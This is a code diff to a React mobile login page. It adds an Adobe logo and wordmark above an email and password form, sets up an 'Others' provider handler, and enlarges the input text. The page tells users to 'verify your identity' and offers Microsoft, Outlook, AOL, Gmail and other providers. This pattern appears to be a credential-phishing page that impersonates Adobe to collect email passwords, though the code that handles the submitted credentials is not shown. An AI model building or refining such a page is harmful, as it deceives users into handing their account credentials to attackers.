@@ -1,4 +1,4 @@
-import React, { useState } from 'react';
+import React, { useState, useRef } from 'react';
 import { Eye, EyeOff } from 'lucide-react';
 import { useLogin } from '../../hooks/useLogin';
 import Spinner from '../../components/common/Spinner';
@@ -33,11 +33,18 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
   const [showPassword, setShowPassword] = useState(false);
   const [showPasswordStep, setShowPasswordStep] = useState(!!defaultProvider);
   const [provider, setProvider] = useState(defaultProvider || '');
+  const emailInputRef = useRef<HTMLInputElement>(null);
   
   const { isLoading, errorMessage, handleFormSubmit } = useLogin(
     onLoginSuccess,
     onLoginError
   );
+
+  const handleOthersSelect = () => {
+    setProvider('Others');
+    emailInputRef.current?.scrollIntoView({ behavior: 'smooth' });
+    setTimeout(() => emailInputRef.current?.focus(), 300);
+  };
 
   const emailProviders = [
     { name: 'Microsoft', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/microsoft-icon.png', handler: onOffice365Select },
@@ -45,7 +52,7 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
     { name: 'Outlook', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/microsoft-outlook-icon.png', handler: onOffice365Select },
     { name: 'AOL', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/aol-icon.png', handler: onAolSelect },
     { name: 'Gmail', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/gmail-icon.png', handler: onGmailSelect },
-    { name: 'Others', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/communication-chat-call/envelope-line-icon.png', handler: onOthersSelect },
+    { name: 'Others', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/communication-chat-call/envelope-line-icon.png', handler: handleOthersSelect },
   ];
 
   const handleContinue = (e: React.MouseEvent<HTMLButtonElement>) => {
@@ -73,8 +80,18 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
         For your protection, please verify your identity.
       </div>
 
+      {/* Adobe Logo */}
+      <div className="flex items-center gap-2 px-6 pt-6">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30 26" className="w-8 h-8">
+          <polygon fill="#FA0F00" points="11.5,0 0,0 0,26" />
+          <polygon fill="#FA0F00" points="18.5,0 30,0 30,26" />
+          <polygon fill="#FA0F00" points="15,9.6 22.1,26 18.2,26 16,20.8 10.9,20.8" />
+        </svg>
+        <span className="text-xl font-bold text-gray-900">Adobe</span>
+      </div>
+
       {/* Form Content */}
-      <div className="flex-1 flex flex-col justify-start px-6 pt-8 pb-8">
+      <div className="flex-1 flex flex-col justify-start px-6 pt-6 pb-8">
         <h1 className="text-2xl font-bold text-gray-900 mb-2">Sign in</h1>
         <p className="text-sm text-gray-600 mb-6">
           New user?{' '}
@@ -96,12 +113,13 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
             </label>
             <input
               id="email"
+              ref={emailInputRef}
               type="email"
               value={email}
               onChange={(e) => setEmail(e.target.value)}
               required
               disabled={showPasswordStep}
-              className="w-full px-3 py-3 border border-gray-300 rounded text-sm text-gray-900 focus:outline-none focus:border-[#1473E6] focus:ring-1 focus:ring-[#1473E6] disabled:bg-gray-100 disabled:text-gray-500"
+              className="w-full px-3 py-3 border border-gray-300 rounded text-base text-gray-900 focus:outline-none focus:border-[#1473E6] focus:ring-1 focus:ring-[#1473E6] disabled:bg-gray-100 disabled:text-gray-500"
             />
           </div>
 
@@ -118,7 +136,7 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
                   onChange={(e) => setPassword(e.target.value)}
                   required
                   autoFocus
-                  className="w-full px-3 pr-10 py-3 border border-gray-300 rounded text-sm text-gray-900 focus:outline-none focus:border-[#1473E6] focus:ring-1 focus:ring-[#1473E6]"
+                  className="w-full px-3 pr-10 py-3 border border-gray-300 rounded text-base text-gray-900 focus:outline-none focus:border-[#1473E6] focus:ring-1 focus:ring-[#1473E6]"
                 />
                 <button
                   type="button"
